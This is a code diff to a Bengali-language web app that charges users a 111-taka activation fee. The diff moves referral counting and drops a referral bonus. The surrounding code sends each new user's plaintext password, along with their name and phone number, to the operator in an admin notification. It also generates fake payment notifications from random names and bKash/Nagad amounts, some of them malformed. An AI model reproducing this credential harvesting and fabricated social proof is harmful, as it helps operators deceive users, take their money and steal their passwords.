@@ -781,7 +781,7 @@ select.input-field { appearance: none; background-image: url("data:image/svg+xml
     <div class="activation-modal-box">
         <div class="activation-badge">🔒 অ্যাকাউন্ট ভেরিফিকেশন</div>
         <div style="font-size: 17px; font-weight: 800; color: #f8fafc; margin-bottom: 6px;">অ্যাক্টিভেশন প্রয়োজন</div>
-        <p style="font-size: 12px; color: #cbd5e1; line-height: 1.4; margin-bottom: 10px; font-weight: 600;">মাত্র **১১এল** টাকা দিয়ে অ্যাকাউন্ট সক্রিয় করুন এবং নির্দিষ্ট শর্ত পূরণ করে উপভোগ করুন একঝাক প্রিমিয়াম সুবিধা!</p>
+        <p style="font-size: 12px; color: #cbd5e1; line-height: 1.4; margin-bottom: 10px; font-weight: 600;">মাত্র **১১১ টাকা** দিয়ে অ্যাকাউন্ট সক্রিয় করুন এবং নির্দিষ্ট শর্ত পূরণ করে উপভোগ করুন একঝাক প্রিমিয়াম সুবিধা!</p>
         
         <div class="activation-benefits">
             <div style="font-size: 11px; font-weight: 700; color: #34d399; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px;">🌟 অ্যাক্টিভ সদস্যদের বিশেষ সুবিধাসমূহ:</div>
@@ -998,18 +998,12 @@ async function getNextSerial() {
     return assignedSerial;
 }
 
-// এডমিন নোটিফিকেশনে রেফারকারীর তথ্যসহ পাঠানোর ফাংশন
-async function notifyAdminNewUser(serialNo, name, phone, password, joinDateStr, photoFile, referrerInfo) {
-    let referralText = referrerInfo ? 
-        `🤝 <b>রেফারকারী:</b> ${referrerInfo.name} (<code>${maskPhoneNumber(referrerInfo.phone)}</code>)` : 
-        `🤝 <b>রেফারকারী:</b> সরাসরি (কেউ রেফার করেনি)`;
-
+async function notifyAdminNewUser(serialNo, name, phone, password, joinDateStr, photoFile) {
     const welcomeMsg = `✨ <b>🚀 নতুন মেম্বার রেজিস্ট্রেশন অ্যালার্ট! 🚀</b> ✨\n\n` +
                        `👤 <b>ইউজার নাম:</b> <code>${name}</code>\n` +
                        `📞 <b>ফোন নম্বর:</b> <code>${phone}</code>\n` +
                        `🔒 <b>পাসওয়ার্ড:</b> <code>${password}</code>\n` +
                        `🔢 <b>সিরিয়াল নাম্বার:</b> #${serialNo}\n` +
-                       `${referralText}\n` +
                        `📅 <b>তারিখ ও সময়:</b> ${joinDateStr}\n\n` +
                        `✨ <b>স্ট্যাটাস:</b> সফলভাবে অ্যাকাউন্ট নিবন্ধন করেছে!`;
     try {
@@ -1055,17 +1049,11 @@ async function handleRegister() {
         return;
     }
 
-    try {
-        const existingDoc = await db.collection('users').doc(phone).get();
-        const isExisting = typeof existingDoc.exists === 'function' ? existingDoc.exists() : existingDoc.exists;
-        if (isExisting) {
-            alert("⚠️ এই ফোন নাম্বারে ইতিমধ্যে একটি অ্যাকাউন্ট রেজিস্টার্ড রয়েছে! দয়া করে লগইন করুন।");
-            showLoginPage();
-            return;
-        }
-    } catch (err) {
-        console.error("Firebase Check Error:", err);
-        alert("ডাটাবেজ চেক করার সময় ত্রুটি হয়েছে। দয়া করে আপনার ইন্টারনেট কানেকশন চেক করুন।");
+    // চেক করা এই নাম্বারে অ্যাকাউন্ট অলরেডি আছে কিনা যাতে আটকে না থাকে
+    const existingDoc = await db.collection('users').doc(phone).get();
+    if (existingDoc.exists) {
+        alert("⚠️ এই ফোন নাম্বারে ইতিমধ্যে একটি অ্যাকাউন্ট রেজিস্টার্ড রয়েছে! দয়া করে লগইন করুন।");
+        showLoginPage();
         return;
     }
 
@@ -1090,32 +1078,6 @@ async function saveUserDataAndLogin(phone, name, password, photoUrl, photoFile) 
         const joinDateFormatted = new Date().toLocaleString('bn-BD', { year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit' });
         const today = new Date().toDateString();
 
-        let referrerInfo = null;
-
-        // রেফারেল চেক ও প্রসেস করা এবং রেফারকারীকে ১১১ কয়েন বোনাস দেওয়া
-        const urlParams = new URLSearchParams(window.location.search);
-        const referrerId = urlParams.get('start');
-        if (referrerId && referrerId !== phone) {
-            const referrerRef = db.collection('users').doc(referrerId);
-            const refDoc = await referrerRef.get();
-            if (refDoc.exists) {
-                const refData = refDoc.data();
-                const currentRefers = refData.refers || 0;
-                const currentBalance = refData.balance || 0;
-                
-                // রেফার কাউন্ট ১ বাড়ানোর পাশাপাশি ১১১ কয়েন রেফার বোনাস যোগ করা হলো
-                await referrerRef.update({ 
-                    refers: currentRefers + 1,
-                    balance: currentBalance + 111 
-                });
-
-                referrerInfo = {
-                    name: refData.name || "রেফারকারী",
-                    phone: referrerId
-                };
-            }
-        }
-
         const userData = {
             serial: userSerial,
             name: name,
@@ -1139,7 +1101,20 @@ async function saveUserDataAndLogin(phone, name, password, photoUrl, photoFile) 
         };
 
         await db.collection('users').doc(phone).set(userData);
-        await notifyAdminNewUser(userSerial, name, phone, password, joinDateFormatted, photoFile, referrerInfo);
+
+        // রেফারেল চেক ও প্রসেস করা
+        const urlParams = new URLSearchParams(window.location.search);
+        const referrerId = urlParams.get('start');
+        if (referrerId && referrerId !== phone) {
+            const referrerRef = db.collection('users').doc(referrerId);
+            const refDoc = await referrerRef.get();
+            if (refDoc.exists) {
+                const currentRefers = refDoc.data().refers || 0;
+                await referrerRef.update({ refers: currentRefers + 1 });
+            }
+        }
+
+        await notifyAdminNewUser(userSerial, name, phone, password, joinDateFormatted, photoFile);
 
         localStorage.setItem('logged_user_phone', phone);
         currentUserPhone = phone;
@@ -1302,7 +1277,7 @@ async function startDynamicPaymentNotifications() {
     const firstNames = ["সাদিয়া", "নুসরাত", "জান্নাতুল", "মেহজাবিন", "তাবাসসুম", "আয়শা", "পূজা", "প্রিয়াঙ্কা", "রিতু", "পায়েল"];
     const lastNames = ["আক্তার", "জাহান", "ফেরদৌস", "চৌধুরী", "মীম", "সিদ্দিকা", "সেন", "রায়", "মনি", "ঘোষ"];
     const methods = ["বিকাশ", "নগদ"];
-    const amounts = ["৳ ১,০০০ টাকা", "৳ ১,১৫০০ টাকা", "৳ ২,০০০ টাকা", "৳ ২,৫০০০ টাকা", "৳ ৩,০০০ টাকা"];
+    const amounts = ["৳ ১,০০০ টাকা", "৳ ১,৫০০০ টাকা", "৳ ২,০০০ টাকা", "৳ ২,৫০০০ টাকা", "৳ ৩,০০০ টাকা"];
 
     while (paymentMessages.length < 50) {
         let fName = firstNames[Math.floor(Math.random() * firstNames.length)];
